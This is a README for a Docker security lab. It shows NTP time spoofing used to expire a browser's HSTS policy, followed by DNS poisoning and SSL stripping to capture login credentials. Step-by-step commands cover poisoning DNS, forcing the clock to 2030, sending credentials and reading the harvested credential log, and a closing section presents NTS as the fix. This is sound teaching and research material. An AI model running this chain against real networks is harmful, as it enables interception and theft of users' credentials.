# ⏳ NTP-HSTS Temporal Bypass: Time-Shifting Attack Lab

**A Proof of Concept (PoC) demonstrating how Network Time Protocol (NTP) spoofing can be used to bypass HTTP Strict Transport Security (HSTS) and execute SSL Stripping.**

## ⚠️ Disclaimer

> **Educational Purpose Only.** This project is designed for security research and learning purposes to demonstrate the importance of Network Time Security (NTS). Do not use these techniques on networks you do not own or have explicit permission to test.

---

## 📖 Overview

Modern browsers use **HSTS (HTTP Strict Transport Security)** to force connections over HTTPS, preventing SSL Stripping attacks. However, HSTS relies on the system clock to determine if a security policy is valid.

This lab demonstrates that by **spoofing NTP packets** and shifting the victim's clock into the future (Post-HSTS Expiry), an attacker can:

1. Expire the HSTS policy.
2. Downgrade the connection to cleartext HTTP.
3. Intercept sensitive credentials (SSL Stripping).

### **The Architecture**

The lab runs on **Docker** with three isolated containers:

1. **Victim (Ubuntu):** A client configured with `ntpdate` (insecure NTP) and `curl`.
2. **Attacker (Alpine):** Running:
    * **Nginx:** Reverse proxy for SSL Stripping.
    * **Dnsmasq:** For DNS Spoofing.
    * **Chrony:** For NTP Spoofing.
3. **Target Server (Nginx):** A secure server enforcing HSTS (1-year duration).

    ![Attack Diagram Placeholder](.img/diagram.png)

---

## 🛠️ Installation & Setup

### 1. Prerequisites

* Docker & Docker Compose
* PowerShell (Windows) or Bash (Linux)

### 2. Build the Lab

Clone the repository and build the containers:

```bash
# 1. Clone the repository
git clone https://github.com/AntonieSoga/ntp-hsts-temporal-bypass.git
cd ntp-hsts-temporal-bypass

# 2. Generate Self-Signed Certificates
docker run --rm -v "${PWD}/webserver:/work" -w /work alpine /bin/sh -c "apk add --no-cache openssl && mkdir -p certs && openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout certs/server.key -out certs/server.crt -subj '/C=US/ST=Test/L=Test/O=Test/CN=secure.test'"

# 3. Start the Environment
docker-compose up -d --build
# Now wait a bit before proceeding to the next step, so the victim container is ready.
```

![docker running](.img/docker_is_up.png)

### ⚔️ The Kill Chain (Walkthrough)

#### Phase 1: The "Safe" State (Year 2026)

Initially, the network is secure. The Attacker's DNS points to the Real Server (172.20.0.10).

1. Victim establishes HSTS Trust: The victim logs in securely. The browser caches the HSTS rule.

    ```bash
    docker exec victim-client curl -v -k --resolve secure.test:443:172.20.0.10 --hsts /hsts.txt https://secure.test/login -d "username=admin&password=SafePassword"
    ```

2. Verification: The server responds with: Login Successful! (Connection is Secure via HTTPS. You are SAFE.)

    ![secure login](.img/secureLogin.png)

#### Phase 2: Setting the Trap (DNS Poisoning)

The attacker manually redirects the victim's traffic to the malicious proxy.

1. Poison DNS: Redirect secure.test to the Attacker's IP (172.20.0.5).

    ```bash
    docker exec attacker-mitm sed -i 's/172.20.0.10/172.20.0.5/' /etc/dnsmasq.conf
    docker restart attacker-mitm
    ```

2. HSTS Protection Test: Even with the DNS trap set, HSTS blocks the attack because the date is still 2026.

    ```bash
    # Attempting HTTP connection...
    docker exec victim-client curl -v -k -L --hsts /hsts.txt https://secure.test/login -d "user=admin&password=ThisShouldBeSafe"
    ```

    Result: Connection Refused (Attacker cannot decrypt HTTPS).

    ![hsts](.img/HSTS_rocks.png)
    ![hsts](.img/connRefused_HSTS_active.png)

##### Phase 3: The Temporal Attack (Year 2030)

The attacker forces the victim's clock forward to expire the HSTS policy.

1. Launch NTP Spoofing:

    ```bash
    docker exec -d attacker-mitm sh -c "while true; do date -s '2030-01-01 12:00:00'; sleep 1; done"
    ```

2. Wait for Sync: Wait until docker exec victim-client date shows the year 2030.

    ![ntp spoofed](.img/ntpSpoffed_time_updated.png)

3. Execute the Exploit: Now that HSTS is expired, the browser allows the downgrade to HTTP.

    ```bash
    docker exec victim-client curl -v -k -L --hsts /hsts.txt http://secure.test/login -d "user=admin&password=ThisShouldBeSafe"
    ```

    ![hacked](.img/Hacked.png)

    ![passwords](.img/password.png)

### 🕵️ Proof of Compromise

The attacker successfully intercepted the credentials in cleartext.

#### View Attacker Logs

```bash
docker exec attacker-mitm cat /var/log/nginx/creds.log
```

![password](.img/pass.png)

### 🛡️ Remediation (The Fix)

This attack is possible because NTP (Network Time Protocol) is unauthenticated. The solution is NTS (Network Time Security).

#### How NTS prevents this

1. NTS uses TLS to authenticate the time server.

2. If an attacker tries to spoof the time packets, the cryptographic signature fails.

3. The client rejects the fake time update, keeping the clock at 2026.

4. HSTS remains active, and the attack fails.
